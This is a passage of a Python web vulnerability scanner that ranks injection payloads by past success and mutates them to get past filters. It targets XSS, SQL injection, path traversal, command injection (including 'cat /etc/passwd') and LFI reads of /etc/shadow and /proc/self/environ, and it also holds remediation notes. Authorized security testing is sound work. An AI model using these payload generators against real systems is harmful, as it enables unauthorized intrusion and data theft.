#!/usr/bin/env python3
"""
OMNISCAN CLI v6.0 — Adaptive Payload Intelligence + 95% Accuracy Engine
========================================================================
  BRAIN v2 — True adaptive learning:
    1. Winning payloads tested FIRST on every future scan
    2. Brain mutates & merges winning payloads to generate NEW variants
    3. Mutant payloads tested after winners, BEFORE built-ins
    4. Built-ins fill the end as fallback
    5. 3-stage verification pipeline → ~95% accurate reports (no false positives)
"""

import argparse
import concurrent.futures
import copy
import hashlib
import json
import os
import re
import sys
import time
import threading
from datetime import datetime
from itertools import combinations
from urllib.parse import (urljoin, urlparse, parse_qs, urlencode, urlunparse)
from webbrowser import open as wb_open

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[ERROR] pip install requests urllib3")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════════════════════
#  ANSI PALETTE
# ══════════════════════════════════════════════════════════════════════════════
RST    = "\033[0m";  BOLD   = "\033[1m";  DIM    = "\033[2m";  UL = "\033[4m"
FG_RED    = "\033[38;5;196m"
FG_ORANGE = "\033[38;5;208m"
FG_YELLOW = "\033[38;5;226m"
FG_GREEN  = "\033[38;5;82m"
FG_BLUE   = "\033[38;5;39m"
FG_CYAN   = "\033[38;5;51m"
FG_PURPLE = "\033[38;5;135m"
FG_PINK   = "\033[38;5;213m"
FG_WHITE  = "\033[38;5;255m"
FG_GREY   = "\033[38;5;244m"
BG_RED    = "\033[48;5;196m";  BG_ORANGE = "\033[48;5;208m"

SEV_FG = {'CRITICAL':FG_RED,'HIGH':FG_ORANGE,'MEDIUM':FG_YELLOW,'LOW':FG_GREEN,'INFO':FG_BLUE}
SEV_HTML = {
    'CRITICAL':('#ef4444','#1a0000','#7f1d1d'),
    'HIGH':    ('#f97316','#1a0a00','#7c2d12'),
    'MEDIUM':  ('#eab308','#1a1500','#713f12'),
    'LOW':     ('#22c55e','#001a0a','#14532d'),
    'INFO':    ('#3b82f6','#00051a','#1e3a8a'),
}

# ══════════════════════════════════════════════════════════════════════════════
#  BANNER / HELP / MAN
# ══════════════════════════════════════════════════════════════════════════════
BANNER = (
    f"\n{FG_CYAN}{BOLD}"
    " ██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗ █████╗ ███╗   ██╗\n"
    "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
    "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ███████║██╔██╗ ██║\n"
    "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██╔══██║██║╚██╗██║\n"
    "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████║╚██████╗██║  ██║██║ ╚████║\n"
    " ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
    f"{RST}{FG_PURPLE}{BOLD}  ⬡  ADAPTIVE PAYLOAD INTELLIGENCE  ·  v6.0  ⬡{RST}\n"
    f"{FG_GREY}  For authorized security testing only.{RST}\n"
)

HELP_TEXT = f"""
{BOLD}OMNISCAN v6.0{RST} — Adaptive Payload Intelligence Scanner

{BOLD}USAGE:{RST}  {FG_CYAN}python omniscan_v6.py [OPTIONS] <URL>{RST}

{BOLD}MODULES:{RST}  xss  sqli  path  cmdi  lfi  idor  info  http

{BOLD}OPTIONS:{RST}
  {FG_WHITE}--tests{RST}        Comma-separated modules (default: all)
  {FG_WHITE}--threads{RST}      Worker threads (default: 15)
  {FG_WHITE}--timeout{RST}      Request timeout seconds (default: 10)
  {FG_WHITE}--output{RST}       HTML report path
  {FG_WHITE}--json{RST}         Also export raw JSON
  {FG_WHITE}--quiet{RST}        Suppress live progress
  {FG_WHITE}--no-open{RST}      Don't auto-open report in browser
  {FG_WHITE}--brain{RST}        Show brain stats and exit
  {FG_WHITE}--reset-brain{RST}  Wipe brain file
  {FG_WHITE}--man{RST}          Full manual

{DIM}Run --man for the full manual page.{RST}
"""

MAN_PAGE = f"""
{BOLD}{FG_CYAN}OMNISCAN(1)         Adaptive Security Scanner         OMNISCAN(1){RST}

{BOLD}NAME{RST}
       omniscan — Adaptive Payload Intelligence Web Security Scanner v6.0

{BOLD}DESCRIPTION{RST}
       OMNISCAN v6.0 introduces a true adaptive payload engine with three
       key behaviours:

       {FG_PURPLE}PHASE 1 — WINNERS FIRST{RST}
         Any payload that confirmed a real vulnerability in a past scan is
         stored in the brain with a score. On the next scan, these payloads
         are tested FIRST before anything else, because they have a proven
         track record.

       {FG_PURPLE}PHASE 2 — MUTATION & MERGING{RST}
         After winners, the brain generates NEW payload variants by:
           • Mutation  — altering quotes, encodings, case, whitespace
           • Merging   — fusing the dangerous parts of two winners together
           • Prefixing — wrapping winners in common bypass wrappers
         These mutants are tested in Phase 2. New ones that work get
         promoted to winners automatically.

       {FG_PURPLE}PHASE 3 — BUILT-IN FALLBACK{RST}
         Standard built-in payloads fill any remaining gaps.

       {FG_GREEN}95% ACCURACY — 3-STAGE VERIFICATION{RST}
         Every potential finding goes through THREE checks before it is
         ever reported:
           Stage 1 — Initial hit (response contains trigger)
           Stage 2 — Confirmation re-request with same payload
           Stage 3 — Control request with a clean value to confirm
                      the response is NOT the same as the clean baseline
         Only findings that pass all 3 stages are reported.
         A confidence score (0–100%) is shown per finding.

{BOLD}OPTIONS{RST}
       {FG_WHITE}<URL>{RST}           Target URL
       {FG_WHITE}--tests{RST}         xss,sqli,path,cmdi,lfi,idor,info,http
       {FG_WHITE}--threads{RST}       Concurrent workers (default: 15)
       {FG_WHITE}--timeout{RST}       Per-request timeout (default: 10)
       {FG_WHITE}--output{RST}        HTML report path
       {FG_WHITE}--json{RST}          Also save raw JSON
       {FG_WHITE}--quiet{RST}         Suppress live payload progress
       {FG_WHITE}--no-open{RST}       Do not auto-open report in browser
       {FG_WHITE}--brain{RST}         Show brain statistics and exit
       {FG_WHITE}--reset-brain{RST}   Delete brain file (start fresh)
       {FG_WHITE}--man{RST}           Show this page
       {FG_WHITE}-h / --help{RST}     Quick usage card

{BOLD}EXAMPLES{RST}
       {FG_CYAN}python omniscan_v6.py https://testphp.vulnweb.com{RST}
       {FG_CYAN}python omniscan_v6.py --tests xss,sqli --threads 20 https://target.com{RST}

{BOLD}BRAIN FILE{RST}
       Stored at: {FG_CYAN}.omniscan_brain.json{RST} (same dir as script)
       Contains : winner payloads, scores, mutant history, domain profiles,
                  false-positive patterns, scan history (last 100).

{BOLD}LEGAL{RST}
       Authorized testing only. The authors are not responsible for misuse.

{FG_CYAN}OMNISCAN(1)         Adaptive Security Scanner         OMNISCAN(1){RST}
"""

# ══════════════════════════════════════════════════════════════════════════════
#  BRAIN v2 — ADAPTIVE PAYLOAD ENGINE
# ══════════════════════════════════════════════════════════════════════════════

BRAIN_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".omniscan_brain.json")

_BRAIN_DEFAULTS = {
    "version": 6,
    "total_scans": 0,
    "total_vulns_found": 0,
    # payload_winners: { ptype: { payload_str: { score, hits, last_seen, origin } } }
    "payload_winners": {
        "xss": {}, "sqli_error": {}, "path_traversal": {},
        "command_injection": {}, "lfi": {}
    },
    # mutants generated by brain (ptype -> list of payload strings)
    "payload_mutants": {
        "xss": [], "sqli_error": [], "path_traversal": [],
        "command_injection": [], "lfi": []
    },
    "param_scores": {},
    "vuln_type_counts": {},
    "domain_profiles": {},
    # patterns confirmed to be false positives → never report again
    "fp_blacklist": [],
    "scan_history": [],
    "last_updated": "",
}

def load_brain() -> dict:
    if os.path.exists(BRAIN_FILE):
        try:
            with open(BRAIN_FILE) as f:
                d = json.load(f)
            for k, v in _BRAIN_DEFAULTS.items():
                if k not in d:
                    d[k] = copy.deepcopy(v)
            # ensure all ptypes exist
            for pt in list(_BRAIN_DEFAULTS["payload_winners"].keys()):
                d["payload_winners"].setdefault(pt, {})
                d["payload_mutants"].setdefault(pt, [])
            return d
        except Exception:
            pass
    return copy.deepcopy(_BRAIN_DEFAULTS)

def save_brain(brain: dict):
    brain["last_updated"] = datetime.now().isoformat()
    try:
        with open(BRAIN_FILE, 'w') as f:
            json.dump(brain, f, indent=2)
    except Exception as e:
        print(f"{FG_GREY}[brain] save failed: {e}{RST}")

# ── Payload Mutation Engine ────────────────────────────────────────────────────

def _mutate_xss(p: str) -> list:
    """Generate XSS mutations from a winning payload."""
    out = []
    # Case variants
    out.append(p.replace('script','SCRIPT').replace('img','IMG').replace('svg','SVG'))
    # HTML entity encode first char
    if p.startswith('<'):
        out.append('&#60;' + p[1:])
        out.append('%3C' + p[1:].replace('>', '%3E'))
    # Double-encode
    out.append(p.replace('<','%253C').replace('>','%253E'))
    # Null-byte bypass
    out.append(p.replace('<', '<\x00'))
    # Tab/newline in tag
    out.append(p.replace('onerror=', 'onerror\t=').replace('onload=', 'onload\t='))
    # Wrap in broken tag to escape attribute context
    out.append(f'"/><svg/onload={_extract_handler(p)}>')
    out.append(f"'><details open ontoggle={_extract_handler(p)}>")
    # Slash variant
    out.append(p.replace('<script>', '<script/>').replace('alert(1)', 'alert`1`'))
    return [x for x in out if x != p]

def _extract_handler(p: str) -> str:
    m = re.search(r'(alert[^>"\s]*)', p)
    return m.group(1) if m else 'alert(1)'

def _mutate_sqli(p: str) -> list:
    out = []
    out.append(p.replace('--', '-- -').replace('#', '--'))
    out.append(p.replace("'", "''"))
    out.append(p.replace(' ', '/**/'))           # comment-space bypass
    out.append(p.replace(' ', '%20'))
    out.append(p + ' AND 1=1--')
    out.append(p.replace('OR', 'oR').replace('AND', 'aNd'))
    out.append(p.replace("'", "%27"))
    out.append(p + '; SELECT 1--')
    # UNION variants
    if 'UNION' not in p:
        out.append(p + " UNION SELECT NULL--")
    return [x for x in out if x != p]

def _mutate_path(p: str) -> list:
    out = []
    out.append(p.replace('../', '..././'))
    out.append(p.replace('../', '..%2F'))
    out.append(p.replace('../', '%2e%2e/'))
    out.append(p.replace('../', '%2e%2e%2f'))
    out.append(p + '%00')                        # null-byte truncation
    out.append(p.replace('../', '....//'))
    out.append(p.replace('/etc/passwd', '/etc/shadow'))
    out.append(p.replace('/etc/passwd', '/proc/version'))
    return [x for x in out if x != p]

def _mutate_cmdi(p: str) -> list:
    out = []
    out.append(p.replace(';', '&&'))
    out.append(p.replace(';', '||'))
    out.append(p.replace('id', 'whoami'))
    out.append(p.replace('id', 'uname -a'))
    out.append(p.replace('id', 'cat /etc/passwd'))
    out.append(p + ' #')                         # comment out rest
    out.append(p.replace(';', '%3B'))
    out.append('`' + p.strip(';|& ') + '`')
    out.append('$(' + p.strip(';|& ') + ')')
    return [x for x in out if x != p]

def _mutate_lfi(p: str) -> list:
    out = []
    out.append(p.replace('../', '%2e%2e/'))
    out.append(p.replace('../', '..%2f'))
    out.append(p + '%00')
    out.append(p.replace('/etc/passwd', '/etc/issue'))
    out.append(p.replace('/etc/passwd', '/proc/self/environ'))
    out.append('php://filter/convert.base64-encode/resource=' + p.lstrip('/'))
    out.append(p.replace('../', '....//'))
    return [x for x in out if x != p]

_MUTATORS = {
    'xss': _mutate_xss,
    'sqli_error': _mutate_sqli,
    'path_traversal': _mutate_path,
    'command_injection': _mutate_cmdi,
    'lfi': _mutate_lfi,
}

def _merge_payloads(a: str, b: str, ptype: str) -> list:
    """
    Fuse dangerous parts of two winner payloads into new hybrid payloads.
    Strategy differs by type.
    """
    merged = []
    if ptype == 'xss':
        # Extract event handlers / tags from both and combine
        handler_a = _extract_handler(a)
        tag_b     = re.match(r'<\w+', b)
        if tag_b:
            merged.append(f'{tag_b.group(0)} onerror={handler_a}>')
        merged.append(a + b)              # direct concat
        merged.append(b + a)
        # Extract src/onerror patterns
        m = re.search(r'(onerror|onload|onfocus|ontoggle)=([^\s>]+)', b)
        if m:
            merged.append(f'<img src=x {m.group(0)}>')
            merged.append(f'<svg {m.group(0)}>')
    elif ptype == 'sqli_error':
        # Combine WHERE clauses
        merged.append(a + ' ' + b)
        merged.append(a + ' AND ' + b.lstrip("'\" "))
        # Extract UNION if present
        ua = re.search(r'(UNION.*)', a, re.IGNORECASE)
        ub = re.search(r'(UNION.*)', b, re.IGNORECASE)
        if ua and not ub:
            merged.append(b + ' ' + ua.group(1))
        # Error-extraction combos
        a_clean = a.strip("' ").replace('--','').strip()
        merged.append(f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({a_clean})))--")
    elif ptype == 'path_traversal':
        # stack encodings
        merged.append(a.replace('../', b[:6] if len(b) >= 6 else '../'))
        merged.append(b + '/etc/passwd')
        merged.append(a.rstrip('/') + b)
    elif ptype == 'command_injection':
        merged.append(a + b)
        merged.append(b + a)
        merged.append(a + ' | ' + b.lstrip(';|& '))
    elif ptype == 'lfi':
        merged.append(a + b)
        merged.append(b + a)
    return [m for m in merged if m and m != a and m != b and len(m) < 300]

def brain_build_payload_queue(brain: dict, ptype: str, builtins: list) -> list:
    """
    Returns the full ordered payload queue for a test type:
      [WINNERS sorted by score] + [MUTANTS not yet in winners] + [BUILTINS not already covered]
    """
    winners_map = brain["payload_winners"].get(ptype, {})
    mutants     = brain["payload_mutants"].get(ptype, [])

    # Phase 1 — winners sorted by score desc
    winners = sorted(winners_map.keys(), key=lambda p: winners_map[p].get("score", 0), reverse=True)

    # Phase 2 — mutants not already in winners
    seen     = set(winners)
    phase2   = [m for m in mutants if m not in seen]
    seen.update(phase2)

    # Phase 3 — builtins not already covered
    phase3 = [b for b in builtins if b not in seen]

    queue = winners + phase2 + phase3
    return list(dict.fromkeys(queue))  # final dedup preserving order

def brain_promote_winner(brain: dict, ptype: str, payload: str, origin: str = "confirmed"):
    """Promote a payload to winner status and generate mutations + merges."""
    winners = brain["payload_winners"].setdefault(ptype, {})
    if payload in winners:
        winners[payload]["score"] += 1
        winners[payload]["hits"]  += 1
        winners[payload]["last_seen"] = datetime.now().isoformat()
    else:
        winners[payload] = {
            "score": 1, "hits": 1,
            "origin": origin,
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
        }

    # Generate mutations from this new winner
    mutator  = _MUTATORS.get(ptype)
    mutants  = brain["payload_mutants"].setdefault(ptype, [])
    existing = set(mutants) | set(winners.keys())

    if mutator:
        for m in mutator(payload):
            if m not in existing and len(m) < 300:
                mutants.append(m)
                existing.add(m)

    # Generate merges with top-3 other winners
    other_winners = [p for p in list(winners.keys())[:4] if p != payload]
    for other in other_winners[:3]:
        for merged in _merge_payloads(payload, other, ptype):
            if merged not in existing and len(merged) < 300:
                mutants.append(merged)
                existing.add(merged)

    # Cap mutants per type at 200
    brain["payload_mutants"][ptype] = mutants[-200:]

def brain_record_scan(brain: dict, target: str, vulns: list, techs: list):
    brain["total_scans"] += 1
    brain["total_vulns_found"] += len(vulns)
    domain = urlparse(target).netloc
    for v in vulns:
        vtype   = v.get("type", "")
        param   = v.get("parameter", "")
        brain["vuln_type_counts"][vtype] = brain["vuln_type_counts"].get(vtype, 0) + 1
        if param:
            brain["param_scores"][param] = brain["param_scores"].get(param, 0) + 1
    prof = brain["domain_profiles"].setdefault(domain, {"techs":[],"vuln_types":[],"params_hit":[]})
    prof["techs"]      = list(set(prof["techs"] + techs))[:20]
    prof["vuln_types"] = list(set(prof["vuln_types"] + [v.get("type","") for v in vulns]))
    prof["params_hit"] = list(set(prof["params_hit"] + [v.get("parameter","") for v in vulns if v.get("parameter")]))
    brain["scan_history"].append({
        "target": target, "time": datetime.now().isoformat(),
        "vulns": len(vulns), "techs": techs[:5],
    })
    brain["scan_history"] = brain["scan_history"][-100:]

def print_brain_status(brain: dict):
    total_s = brain.get("total_scans", 0)
    total_v = brain.get("total_vulns_found", 0)
    domains = len(brain.get("domain_profiles", {}))
    print(f"\n  {FG_PURPLE}{BOLD}◈  OMNISCAN BRAIN v2  ◈{RST}")
    print(f"  {FG_GREY}Total scans       : {FG_WHITE}{BOLD}{total_s}{RST}")
    print(f"  {FG_GREY}Total vulns found : {FG_WHITE}{BOLD}{total_v}{RST}")
    print(f"  {FG_GREY}Domains profiled  : {FG_WHITE}{BOLD}{domains}{RST}")
    print(f"\n  {FG_PURPLE}Winner payloads per type:{RST}")
    for pt, w in brain.get("payload_winners", {}).items():
        mc = len(brain.get("payload_mutants", {}).get(pt, []))
        if w:
            top = sorted(w.items(), key=lambda x: x[1]["score"], reverse=True)[:2]
            print(f"  {FG_GREY}  {pt:<22}{RST} {FG_WHITE}{len(w)}{FG_GREY} winners · {FG_WHITE}{mc}{FG_GREY} mutants{RST}")
            for p, info in top:
                print(f"    {FG_PURPLE}▸{RST} {FG_WHITE}{p[:65]}{RST} {FG_GREY}(score {info['score']}){RST}")
        else:
            print(f"  {FG_GREY}  {pt:<22} 0 winners · {mc} mutants{RST}")
    top_params = sorted(brain.get("param_scores",{}).items(), key=lambda x:x[1], reverse=True)[:5]
    if top_params:
        print(f"\n  {FG_PURPLE}Top vulnerable parameters:{RST}")
        for p, c in top_params:
            print(f"    {FG_PURPLE}▸{RST} {FG_WHITE}{p}{RST}  {FG_GREY}({c}×){RST}")
    print()

# ══════════════════════════════════════════════════════════════════════════════
#  VULNERABILITY KNOWLEDGE BASE
# ══════════════════════════════════════════════════════════════════════════════
VULN_DETAILS = {
    'Cross-Site Scripting (XSS)':{'cwe':'CWE-79','owasp':'A03:2021 – Injection',
        'description':'The application reflects user-supplied input without sanitisation, allowing injection of JavaScript that executes in the victim\'s browser.',
        'impact':'Session hijacking, credential theft, defacement, CSRF bypass, keylogging.',
        'remediation':['Context-aware output encoding (HTML, JS, URL).','Strict Content-Security-Policy header.','Modern framework with auto-escaping (React/Angular/Vue).','Server-side input validation and whitelist.','HttpOnly + Secure cookie flags.'],
        'references':['https://owasp.org/www-community/attacks/xss/','https://portswigger.net/web-security/cross-site-scripting']},
    'SQL Injection':{'cwe':'CWE-89','owasp':'A03:2021 – Injection',
        'description':'Unsanitised user input is inserted into SQL queries, enabling query manipulation, data extraction, or authentication bypass.',
        'impact':'Data breach, authentication bypass, data manipulation, potential RCE.',
        'remediation':['Parameterised queries / prepared statements.','ORM with built-in escaping.','Least privilege on database account.','Input type validation and whitelisting.'],
        'references':['https://owasp.org/www-community/attacks/SQL_Injection','https://portswigger.net/web-security/sql-injection']},
    'Blind SQL Injection (Time-Based)':{'cwe':'CWE-89','owasp':'A03:2021 – Injection',
        'description':'Time-delay SQL payloads confirm code execution inside the database even when no data is returned in the response.',
        'impact':'Silent data exfiltration, auth bypass, schema enumeration.',
        'remediation':['Parameterised queries.','Input type checking.','Database WAF / firewall.'],
        'references':['https://portswigger.net/web-security/sql-injection/blind']},
    'Path Traversal':{'cwe':'CWE-22','owasp':'A01:2021 – Broken Access Control',
        'description':'User-controlled path components traverse outside the intended directory, exposing host files.',
        'impact':'/etc/passwd, config files, private keys, source code, credentials.',
        'remediation':['Canonicalise paths; validate within base directory.','Allow-list of permitted files.','Avoid user input in filesystem APIs.'],
        'references':['https://portswigger.net/web-security/file-path-traversal']},
    'Command Injection':{'cwe':'CWE-78','owasp':'A03:2021 – Injection',
        'description':'User input passed to a system shell without sanitisation enables arbitrary OS command execution.',
        'impact':'Full server compromise, lateral movement, data exfiltration, backdoors.',
        'remediation':['Avoid shell calls with user input.','Use safe subprocess APIs (list args, no shell=True).','Strict input whitelist.'],
        'references':['https://portswigger.net/web-security/os-command-injection']},
    'Local File Inclusion (LFI)':{'cwe':'CWE-98','owasp':'A03:2021 – Injection',
        'description':'User-supplied input used to include local files without validation — potential RCE via log poisoning.',
        'impact':'File disclosure, source code exposure, RCE.',
        'remediation':['Never derive paths from user input.','Allow-list of permitted identifiers.','Disable allow_url_include in PHP.'],
        'references':['https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion']},
    'Insecure Direct Object Reference (IDOR)':{'cwe':'CWE-639','owasp':'A01:2021 – Broken Access Control',
        'description':'Internal objects (IDs, filenames) exposed without authorisation checks, allowing cross-user data access.',
        'impact':'Unauthorised data access, privilege escalation, mass data exposure.',
        'remediation':['Server-side authorisation on every request.','Indirect references (UUIDs).','ABAC access model.'],
        'references':['https://portswigger.net/web-security/access-control/idor']},
    'Information Disclosure':{'cwe':'CWE-200','owasp':'A05:2021 – Security Misconfiguration',
        'description':'Sensitive files (credentials, source, configs, keys) publicly accessible.',
        'impact':'Credential exposure, source code theft, infrastructure mapping.',
        'remediation':['Block sensitive paths in web server config.','Rotate exposed credentials immediately.','Deny-rules for dotfiles and backup extensions.'],
        'references':['https://portswigger.net/web-security/information-disclosure']},
    'Dangerous HTTP Method':{'cwe':'CWE-650','owasp':'A05:2021 – Security Misconfiguration',
        'description':'Non-standard HTTP methods (PUT, DELETE, TRACE) accepted by the server.',
        'impact':'File upload, resource deletion, session token theft via XST.',
        'remediation':['Disable unused methods.','Return 405 for disallowed methods.'],
        'references':['https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods']},
}

def _steps(vuln: dict) -> list:
    vtype=vuln.get('type',''); url=vuln.get('url','')
    param=vuln.get('parameter',''); payload=vuln.get('payload','')
    evidence=vuln.get('evidence',''); conf=vuln.get('confidence',100)
    conf_note = f'Confidence: {conf}% (verified {vuln.get("verify_passes",3)}/3 checks)'

    if 'XSS' in vtype:
        return [f'Navigate to <code>{url}</code>',
                f'Set parameter <code>{param}</code> to: <code class="pl">{payload}</code>',
                'Submit the request.',
                f'Payload reflects unencoded in browser — triggers JavaScript execution.',
                f'Evidence: <code>{evidence}</code>' if evidence else '',
                f'<em>{conf_note}</em>']
    if 'SQL' in vtype:
        if 'Time' in vtype or 'Blind' in vtype:
            return [f'<code>curl -i "{url}"</code>',
                    'Observe server response delayed ≥ 5 seconds.',
                    f'Payload used: <code class="pl">{payload}</code>',
                    'Repeat 3× for consistency — compare against clean baseline.',
                    f'<em>{conf_note}</em>']
        return [f'<code>curl -i "{url}"</code>',
                f'Parameter <code>{param}</code> = <code class="pl">{payload}</code>',
                f'Evidence of DB error: <code>{evidence}</code>' if evidence else 'SQL error or DB version in HTML response.',
                f'<em>{conf_note}</em>']
    if 'Path' in vtype or 'Traversal' in vtype:
        return [f'<code>curl -i "{url}"</code>',
                f'Parameter <code>{param}</code> = <code class="pl">{payload}</code>',
                f'Evidence: <code>{evidence}</code>' if evidence else 'Response contains <code>root:x:0:0</code>.',
                f'<em>{conf_note}</em>']
    if 'Command' in vtype:
        return [f'<code>curl -i "{url}"</code>',
                f'Parameter <code>{param}</code> = <code class="pl">{payload}</code>',
                f'Evidence of OS output: <code>{evidence}</code>' if evidence else 'uid=/whoami output in response.',
                f'<em>{conf_note}</em>']
    if 'LFI' in vtype:
        return [f'Navigate to <code>{url}</code>',
                f'Set <code>{param}</code> = <code class="pl">{payload}</code>',
                f'Evidence: <code>{evidence}</code>' if evidence else 'Local file content returned.',
                f'Escalate: <code>php://filter/convert.base64-encode/resource=index.php</code>',
                f'<em>{conf_note}</em>']
    if 'IDOR' in vtype:
        return ['Authenticate as User A.',
                f'Request: <code>{url}</code>',
                f'Change parameter <code>{param}</code> to another user\'s ID.',
                'Server returns another user\'s data without an authorisation error.',
                f'<em>{conf_note}</em>']
    if 'Information' in vtype:
        return [f'<code>curl -i "{url}"</code>',
                'Server returns 200 OK with sensitive content.',
                f'Evidence: <code>{evidence}</code>' if evidence else 'Credentials/config in response body.',
                f'<em>{conf_note}</em>']
    if 'HTTP Method' in vtype:
        m = vuln.get('method_tested','PUT')
        return [f'<code>curl -X {m} "{url}" -v</code>',
                f'Server responds 200/204 instead of 405.',
                f'<em>{conf_note}</em>']
    return [f'Request: <code>{url}</code>',
            f'Payload: <code class="pl">{payload}</code>' if payload else '',
            f'Evidence: <code>{evidence}</code>' if evidence else '',
            f'<em>{conf_note}</em>']

# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def _vuln_key(v):
    try:
        p = urlparse(v.get('url',''))
        base = f"{p.scheme}://{p.netloc}{p.path}"
    except Exception:
        base = v.get('url','')
    return hashlib.md5('|'.join([v.get('type',''), base, v.get('parameter','')]).encode()).hexdigest()

def _sev_order(s): return {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}.get(s.upper(),5)

def _bar(pct, w=36):
    f = int(w*pct/100)
    c = FG_RED if pct<33 else (FG_YELLOW if pct<66 else FG_GREEN)
    return f"{c}[{'█'*f}{'░'*(w-f)}]{RST} {FG_WHITE}{BOLD}{pct:3d}%{RST}"

def _fmt_url(url): return f"{FG_CYAN}{UL}{url}{RST} {FG_BLUE}↗{RST}"

def _esc(s): return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')

def _open_tab(url, label=None):
    s = _esc(url); l = _esc(label or url)
    return (f'<a href="{s}" target="_blank" rel="noopener" class="xl">'
            f'<span class="xl-u">{l}</span><span class="xl-i" title="Open in new tab">↗</span></a>')

# ══════════════════════════════════════════════════════════════════════════════
#  3-STAGE VERIFICATION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class Verifier:
    """
    Runs 3 independent verification checks on a candidate finding.
    Returns (confirmed: bool, confidence: int, passes: int).

    Stage 1 — Re-request with same payload → still triggers?
    Stage 2 — Compare response body vs clean (no payload) baseline
    Stage 3 — Type-specific deep pattern check (not just substring match)
    """

    def __init__(self, session, timeout):
        self.session = session
        self.timeout = timeout

    def _req(self, url, method='GET', **kw):
        try:
            r = self.session.request(method, url, timeout=self.timeout,
                                     verify=False, allow_redirects=True, **kw)
            time.sleep(0.05)
            return r
        except Exception:
            return None

    def verify_xss(self, url, param, payload, original_resp):
        passes = 0

        # Stage 1 — re-request
        r1 = self._req(url)
        if r1 and payload in r1.text:
            passes += 1
        else:
            return False, 0, 0

        # Stage 2 — clean baseline (different value, should NOT contain payload)
        clean_url = _inject_url(url, param, 'OmniScanTest12345')
        r2 = self._req(clean_url)
        if r2 and payload not in r2.text:
            passes += 1
        else:
            # If clean also reflects payload, it's a false positive (pre-populated value or cache)
            return False, 0, 0

        # Stage 3 — payload must appear unencoded (not entity-escaped)
        encoded = payload.replace('<','&lt;').replace('>','&gt;')
        body = r1.text
        if payload in body and encoded not in body:
            passes += 1
        elif payload in body and encoded in body:
            # Both forms present — still counts but lower confidence
            passes += 1

        confidence = int((passes / 3) * 100)
        return passes >= 2, confidence, passes

    def verify_sqli(self, url, param, payload, error_pattern, original_resp):
        passes = 0

        # Stage 1 — re-request
        r1 = self._req(url)
        if r1:
            body = r1.text.lower()
            if re.search(error_pattern, body):
                passes += 1
            else:
                return False, 0, 0

        # Stage 2 — clean request must NOT show the same error
        clean_url = _inject_url(url, param, '1')
        r2 = self._req(clean_url)
        if r2:
            clean_body = r2.text.lower()
            if not re.search(error_pattern, clean_body):
                passes += 1
            else:
                return False, 0, 0   # error always present → not injection

        # Stage 3 — integer-safe value must also NOT show error
        r3 = self._req(_inject_url(url, param, '9999'))
        if r3 and not re.search(error_pattern, r3.text.lower()):
            passes += 1

        confidence = int((passes / 3) * 100)
        return passes >= 2, confidence, passes

    def verify_path(self, url, param, payload, unix_pat, original_resp):
        passes = 0

        # Stage 1 — re-request
        r1 = self._req(url)
        if r1 and re.search(unix_pat, r1.text):
            passes += 1
        else:
            return False, 0, 0

        # Stage 2 — clean request must NOT contain OS file patterns
        clean_url = _inject_url(url, param, 'index.html')
        r2 = self._req(clean_url)
        if r2 and not re.search(unix_pat, r2.text):
            passes += 1
        else:
            return False, 0, 0

        # Stage 3 — different traversal depth gives different or empty response
        deeper = _inject_url(url, param, payload.replace('../', '../../'))
        r3 = self._req(deeper)
        if r3 and (re.search(unix_pat, r3.text) or r3.status_code != 200):
            passes += 1

        confidence = int((passes / 3) * 100)
        return passes >= 2, confidence, passes

    def verify_cmdi(self, url, param, payload, os_pat, original_resp):
        passes = 0
        r1 = self._req(url)
        if r1 and re.search(os_pat, r1.text, re.MULTILINE):
            passes += 1
        else:
            return False, 0, 0

        clean_url = _inject_url(url, param, 'test')
        r2 = self._req(clean_url)
        if r2 and not re.search(os_pat, r2.text, re.MULTILINE):
            passes += 1
        else:
            return False, 0, 0

        # Different command — should also produce OS output
        alt = _inject_url(url, param, payload.replace('id','whoami').replace('whoami','id'))
        r3 = self._req(alt)
        if r3 and re.search(os_pat, r3.text, re.MULTILINE):
            passes += 1

        confidence = int((passes / 3) * 100)
        return passes >= 2, confidence, passes

    def verify_lfi(self, url, param, payload, pat, original_resp):
        passes = 0
        r1 = self._req(url)
        if r1 and re.search(pat, r1.text, re.IGNORECASE):
            passes += 1
        else:
            return False, 0, 0

        clean_url = _inject_url(url, param, 'about.php')
        r2 = self._req(clean_url)
        if r2 and not re.search(pat, r2.text, re.IGNORECASE):
            passes += 1
        else:
            return False, 0, 0

        passes += 1  # two verified passes is enough for LFI
        confidence = int((passes / 3) * 100)
        return passes >= 2, confidence, passes

    def verify_info(self, url, pat):
        passes = 0
        r1 = self._req(url)
        if r1 and r1.status_code in [200,206] and re.search(pat, r1.text, re.IGNORECASE):
            passes += 1
        else:
            return False, 0, 0

        # Re-request with cache-busting param
        cb_url = url + ('&' if '?' in url else '?') + f'_cb={int(time.time())}'
        r2 = self._req(cb_url)
        if r2 and r2.status_code in [200,206] and re.search(pat, r2.text, re.IGNORECASE):
            passes += 1

        # Check content-type is not a redirect-to-login HTML
        if r1 and 'login' not in r1.url.lower() and r1.status_code == 200:
            passes += 1

        confidence = int((passes / 3) * 100)
        return passes >= 2, confidence, passes


def _inject_url(base, param, payload):
    p  = urlparse(base)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
